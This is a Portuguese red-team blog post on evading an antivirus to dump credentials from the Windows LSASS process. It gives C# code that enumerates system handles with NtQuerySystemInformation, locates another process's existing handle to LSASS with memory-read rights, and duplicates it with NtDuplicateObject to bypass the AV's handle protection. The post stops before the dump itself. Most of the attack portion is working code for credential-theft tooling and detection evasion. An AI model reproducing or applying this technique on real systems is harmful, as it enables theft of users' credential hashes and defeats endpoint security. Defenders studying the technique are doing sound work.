---
title: "A reciclagem também está presente nos handles."
date: 2023-06-03 00:00:00 +0800
categories: [Windows, LSASS]
tags: [Red Team]
---

Como sabemos, o processo do LSASS é um tesouro quando se observado pelo lado ofensivo. É neste processo que informações de logons de usuários são armazenadas (como as valiosas NT hashes). Quando o assunto é dump de credenciais, um handle com permissões de `PROCESS_VM_READ` ao LSASS se torna tudo o que um atacante quer.

> - `PROCESS_VM_READ¹`: permissão necessária para a leitura da memória (dump) de um processo. 
{: .prompt-info }

Nos últimos tempos, estive me aprofundando em técnicas de dump de LSASS que normalmente um EDR/XDR não detectaria. Em um laboratório, instalei um famoso antivírus do mercado (no qual não citarei o nome) e que me rendeu bastante trabalho. Quando eu abria um novo handle pro LSASS e tentava interagí-lo, um erro era retornado: `STATUS_ACCESS_DENIED`.

![Desktop View](https://i.imgur.com/wihqqna.png)

No código, primeiro é aberto um novo handle pro LSASS com o privilégio `PROCESS_CREATE_PROCESS²`. Como exibido na captura de tela acima, o erro ocorria na execução da API `NtCreateProcessEx³`.


```csharp
uint accessParentProcess = PROCESS_CREATE_PROCESS;
uint accessChildProcess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ ;

IntPtr hParentProcess = OpenProcess((uint)accessParentProcess, false, Convert.ToUInt32(pid)); // abrindo um handle ao LSASS com PROCESS_CREATE_PROCESS

Console.WriteLine($"[+] Handle: {hParentProcess}");

int ningning = NtCreateProcessEx( // clonando o processo do LSASS
	out IntPtr hChildProcess,
	(uint)accessChildProcess,
	IntPtr.Zero,
	hParentProcess,
	0,
	IntPtr.Zero,
	IntPtr.Zero,
	IntPtr.Zero,
	false
);

if (ningning == 0)
{
	uint hChildPid = GetProcessId(hChildProcess);

	Console.WriteLine($"[^] Forked Handle: {hChildProcess}");
	Console.WriteLine($"[^] Forked PID: {hChildPid}");
}
```

> - `PROCESS_CREATE_PROCESS²`: permissão necessária criar um fork (clone) de um processo alvo.
> - `NtCreateProcessEx³`: API utilizada para criar um fork do processo LSASS. 
{: .prompt-info }

Note que foi solicitada a abertura de um novo handle ao LSASS na linha 4 do código. Nele, é especificado que será aberto com os privilégios de `PROCESS_CREATE_PROCESS`. Entretanto, como vimos, um erro de `ACCESS DENIED` é retornado. Pausando a execução do código e partindo para a análise do handle recém-aberto utilizando o programa Process Hacker, nos deparamos com algo bastante interessante:

![Desktop View](https://i.imgur.com/RUkXM62.png)

Descobrimos o motivo do erro! Ao solicitar a abertura de um novo handle ao LSASS, antes dos privilégios serem atribuídos, o AV analisa as permissões que serão dadas e, dependendo delas, serão barradas e não atribuídas ao handle. No final, nenhuma permissão foi atribuída, ocasionando no erro.

![Desktop View](https://i.imgur.com/oAHfhBb.png){: width="300" height="100" }

## Handles também podem ser reciclados!

Como foi visto, não é possível solicitar a abertura de um handle ao LSASS sem que o AV barre a atribuição dos privilégios necessários para o dump. Mas, e se algum programa legítimo já tiver aberto um handle? A pergunta é facilmente respondida com o Process Hacker. Nele, uma funcionalidade que busca por handles filtrados pelo nome.

![Desktop View](https://i.imgur.com/gyyW0Vw.png)

Podemos notar que, de todos os handles abertos ao LSASS, dois são do tipo "processo" (que é o que nos interessa). Averiguando as caracteristicas do handle destacado em vermelho, uma boa notícia vem à tona: suas permissões!

![Desktop View](https://i.imgur.com/1RQOTf1.png)

Maravilha! Como mostrado acima, duas permissões estão atribuídas ao handle LSASS: `PROCESS_VM_READ` e `PROCESS_QUERY_INFORMATION⁴`. É exatamente esta última permissão que nos permite ler a memória do processo, técnica popularmente conhecida como "dump". Agora, vamos dar uma mergulhada no mundo das Windows API. =]

> - `PROCESS_QUERY_INFORMATION⁴`: permissão necessária para descobrir certas informações sobre um processo, como token, código de saída e classe de prioridade.
{: .prompt-info }


## NtQuerySystemInformation⁵

> - `NtQuerySystemInformation⁵`: API utilizada para enumerar todos os handles em abertos do sistema.
{: .prompt-info }

```csharp
public enum SYSTEM_INFORMATION_CLASS
{ SystemHandleInformation = 16 }

public struct SYSTEM_HANDLE_INFORMATION {
	public uint Count;
	public SYSTEM_HANDLE_TABLE_ENTRY_INFO Handle;
}

public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	public ushort UniqueProcessId;
	public byte HandleAttributes;
	public ushort HandleValue;
	public IntPtr Object;
	public uint GrantedAccess;
}

[DllImport("ntdll.dll")]
public static extern NTSTATUS NtQuerySystemInformation(
	[In]  SYSTEM_INFORMATION_CLASS SystemInformationClass,
	[Out] IntPtr SystemInformation,
	[In]  int SystemInformationLength,
	[In]  ref int ReturnLength
);
```

Esta é uma API fundamental para todo o processo. Ela é do tipo `NTSTATUS⁶` e pede alguns valores importantes. São eles:

- `SystemInformationClass`: uma tabela de valores sobre informações do sistema operacional. Neste caso, é necessário somente o valor `SystemHandleInformation⁷`, representado pelo número 16 em hexadecimal.
- `SystemInformation`: a saída da API. É um ponteiro que armazena as informações solicitadas. Neste caso, as informações dos handles em abertos.
- `SystemInformationLength`: o tamanho do buffer, em bytes, apontado pelo `SystemInformation`.
- `ReturnLength`: um ponteiro representando o local onde a função vai escrever o tamanho da informação solicitada pela API. Se o tamanho do `ReturnLength` for menor ou igual ao `SystemInformationLength`, a informação será escrita dentro do `SystemInformation`. Caso contrário, retorna o tamanho do buffer necessário para receber o resultado.

> - `NTSTATUS⁶`: lista de valores que são representados como status code. Bastante utilizada em APIs.
> - `SystemHandleInformation⁷`: um struct que armazenas as informações de handles em abertos do sistema.
{: .prompt-info }

O valor retornado pelo `SystemInformation` é um struct `SYSTEM_HANDLE_INFORMATION`, como visto no código. Nele, é retornado dois valores:

- `Count`: número de handles abertos.
- `Handle`: um struct `SYSTEM_HANDLE_TABLE_ENTRY_INFO` que armazena informações precisas sobre o handle, como PID, privilégios de acesso, entre outros.

Inicialmente, não sabemos o tamanho necessário para alocar devido à incerteza do tamanho da resposta que será atribuída ao `SystemInformation`. Caso o tamanho seja insuficiente, a API retorna o NTSTATUS de `STATUS_INFO_LENGTH_MISMATCH`. Logo, uma boa alternativa seria utilizar um loop que checa o resultado da API. Se o resultado for `STATUS_INFO_LENGTH_MISMATCH`, então mais memória será alocada para armazenar as informações.

```csharp
var systemHandleInformation = new Netdump.Tables.SYSTEM_HANDLE_INFORMATION();

var systemInformationLength = Marshal.SizeOf(systemHandleInformation); // armazenando o tamanho do systemHandleInformation
var systemInformationPtr = Marshal.AllocHGlobal(systemInformationLength); // alocando memória ao systemInformationLength 

var resultLength = 0;

while ( Netdump.Invokes.NtQuerySystemInformation(
	Netdump.Tables.SYSTEM_INFORMATION_CLASS.SystemHandleInformation,
	systemInformationPtr,
	systemInformationLength,
	ref resultLength ) == Netdump.Tables.NTSTATUS.STATUS_INFO_LENGTH_MISMATCH )
{
	systemInformationLength = resultLength; // precisa ser do mesmo tamanho
	Marshal.FreeHGlobal(systemInformationPtr); // liberando memória
	systemInformationPtr = Marshal.AllocHGlobal(systemInformationLength); // atribuindo a nova memória baseada no valor do resultLength
	Console.WriteLine($"[!] (NtQuerySystemInformation) Alocando mais memória: {systemInformationLength}");
}
```
Quando sair do loop, memória suficiente já terá sido alocada e um NTSTATUS de `STATUS_SUCCESS` será retornado, simbolizando sucesso na chamada da API. Com isso, o ponteiro `systemInformationPtr` armazenará dois tipos de informações: o número de handles em aberto e informações sobre eles.

```csharp
var numberOfHandles = Marshal.ReadInt64(systemInformationPtr);

Console.WriteLine($"[+] Número de handles: {numberOfHandles}");
```

![Desktop View](https://i.imgur.com/G8XcKmQ.png)

Feito isso, o próximo objetivo é analisar os handles que estão abertos e armazenados no `systemInformationPtr`. Não é uma tarefa tão fácil, já que precisamos acessar handle por handle e realizar uma consulta na tabela `SYSTEM_HANDLE_TABLE_ENTRY_INFO` para descobrirmos seu PID, por exemplo. Para isso, é uma boa alternativa a criação de um dicionário que armazenará informações sobre os handles.
Posteriormente, um loop que passará por todos os handles através do `numberOfHandles`. É neste loop que iteraremos sobre seus respectivos PIDs e, depois, sobre seus níveis de acesso.

```csharp
public static void IterateHandles(long numberOfHandles, IntPtr systemInformationPtr)
{
	var handleEntryPtr = new IntPtr((long)systemInformationPtr + sizeof(long)); // apontando para o tamanho do numberOfHandles (primeiros 8 bytes)

	Dictionary<int, List<Netdump.Tables.SYSTEM_HANDLE_TABLE_ENTRY_INFO>> handles = new(); // criando um dicionário

	for (var i = 0; i < numberOfHandles; i++) // percorrendo por todos os handles
	{
		var handleTableEntry = (Netdump.Tables.SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(handleEntryPtr, typeof(Netdump.Tables.SYSTEM_HANDLE_TABLE_ENTRY_INFO)); // variável acessando a tabela SYSTEM_HANDLE_TABLE_ENTRY_INFO

		handleEntryPtr = new IntPtr((long)handleEntryPtr + Marshal.SizeOf(handleTableEntry)); // avançando o ponteiro para a próxima entrada
		
		if (!handles.ContainsKey(handleTableEntry.UniqueProcessId)) // acessando a tabela SYSTEM_HANDLE_TABLE_ENTRY_INFO, verificar o UniqueProcessId
		{
			handles.Add(handleTableEntry.UniqueProcessId, new List<Netdump.Tables.SYSTEM_HANDLE_TABLE_ENTRY_INFO>());
			// adicionando o PID se ele ainda não tiver catalogado no dicionário
		}

		handles[handleTableEntry.UniqueProcessId].Add(handleTableEntry);
}

Marshal.FreeHGlobal(systemInformationPtr);

Netdump.Invokes.CloseHandle(handleEntryPtr);
Netdump.Invokes.CloseHandle(systemInformationPtr);
```

Agora que as informações que precisamos estão armazenadas no dicionário, precisamos criar um `foreach` para acessarmos elas de uma por uma. As informações que analisaremos são somente duas: PID e AccessRights. Como são muitos handles, com muitos PIDs diferentes, será criado um `if` para filtrar somente pelo PID que contém o handle pro LSASS (como foi visto pelo Process Hacker).

```csharp
public enum PROCESS_ACCESS : uint 
{
	// struct contendo algumas permissões de processos.
	// neste caso, precisamos somente da PROCESS_VM_READ, mas fica ao seu critério.
	PROCESS_TERMINATE = 0x0001,
	PROCESS_CREATE_THREAD = 0x0002,
	PROCESS_SET_SESSIONID = 0x0004,
	PROCESS_VM_OPERATION = 0x0008,
	PROCESS_VM_READ = 0x0010,
	PROCESS_VM_WRITE = 0x0020,
	PROCESS_DUP_HANDLE = 0x0040,
	PROCESS_CREATE_PROCESS = 0x0080,
	PROCESS_SET_QUOTA = 0x0100,
	PROCESS_SET_INFORMATION = 0x0200,
	PROCESS_QUERY_INFORMATION = 0x0400
}

foreach (var index in handles)
{
	foreach(var handleStruct in index.Value) // handleStruct = SYSTEM_HANDLE_TABLE_ENTRY_INFO
	{
		Netdump.Tables.PROCESS_ACCESS grantedAccess = (Netdump.Tables.PROCESS_ACCESS)handleStruct.GrantedAccess;
		if (grantedAccess.HasFlag(Netdump.Tables.PROCESS_ACCESS.PROCESS_VM_READ))
		{
			if (index.Key == 6020)
			{
				foreach (Netdump.Tables.PROCESS_ACCESS accessRight in Enum.GetValues(typeof(Netdump.Tables.PROCESS_ACCESS)))
				{
					Console.WriteLine($"O identificador do handle é: {handleStruct.HandleValue}. e seus privilégios são: {accessRight.ToString()}");
				}
			}
		}
	}
}
```

![Desktop View](https://i.imgur.com/J4yNvkg.png)

## NtDuplicateObject⁸

> - `NtDuplicateObject⁸`: API utilizada para duplicar um handle alvo.
{: .prompt-info }

Com os identificadores dos handles (PID e AccessRights) em mãos, o próximo passo é duplicá-los para, posteriormente, interagirmos com eles. O processo de duplicação é bem simples, ainda mais quando se tem uma API própria para isso.

```csharp
[Flags]
public enum DUPLICATE_OPTION_FLAGS : uint
{
	CLOSE_SOURCE = 0x00000001,
	SAME_ACCESS = 0x00000002,
	SAME_ATTRIBUTES = 0x00000004
}

[DllImport("ntdll.dll")]
public static extern NTSTATUS NtDuplicateObject(
	IntPtr SourceProcessHandle,
	IntPtr SourceHandle,
	IntPtr TargetProcessHandle,
	out IntPtr TargetHandle,
	uint DesiredAccess,
	bool InheritHandle,
	DUPLICATE_OPTION_FLAGS Options
);
```

```csharp
uint acessOriginal = PROCESS_DUP_HANDLE; // setando privilégios de acesso
uint acessDuplicate = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ; // setando privilégios de acesso

IntPtr hRemoteProcess = Netdump.Invokes.OpenProcess((uint)acessOriginal, false, 6020); // abrindo um handle pro processo que contém o handle do LSASS
if (hRemoteProcess == IntPtr.Zero) { throw new Exception($"[-] OpenProcess: {Marshal.GetLastWin32Error()}"); }

IntPtr hObject = new IntPtr(handle.HandleValue);

Netdump.Tables.NTSTATUS result = Netdump.Invokes.NtDuplicateObject(
	hRemoteProcess, // handle do processo alvo
	hObject, // objeto do handle que será duplicado (serve como um identificador, é o HandleValue)
	new IntPtr(-1), // criação de um pseudo handle
	out IntPtr hDuplicate, // handle duplicado
	(uint)acessDuplicate, // privilégios de acesso do handle duplicado
	false, // herdar handles?
	Netdump.Tables.DUPLICATE_OPTION_FLAGS.SAME_ACCESS // mesmo nível de acesso do handle original
);

if (result == Netdump.Tables.NTSTATUS.STATUS_SUCCESS && hDuplicate != IntPtr.Zero)
{
	Console.WriteLine($"Handle duplicado! {hDuplicate}");
}

else { throw new Exception($"[-] NtDuplicateObject: {Marshal.GetLastWin32Error()}"); }

Netdump.Invokes.CloseHandle(hRemoteProcess);
Netdump.Invokes.CloseHandle(hDuplicate);
Netdump.Invokes.CloseHandle(hObject);
```

Para duplicarmos um handle, precisamos de uma permissão crucial: `PROCESS_DUP_HANDLE⁹`. É esta permissão que será solicitada na abertura de um novo handle ao processo alvo (o de PID 6020, conforme visto no Process Hacker. É este processo que queremos porque é ele que possui o handle pro LSASS). Feito isso, é chamada a API para a duplicação do handle. O `hObject` é o identificador do handle que queremos duplicar. Pegamos este identificador graças a API `NtQuerySystemInformation`. E, por último, representado pelo `hDuplicate`, o handle duplicado! Mas não se engane: este ainda não é o handle do LSASS! :P
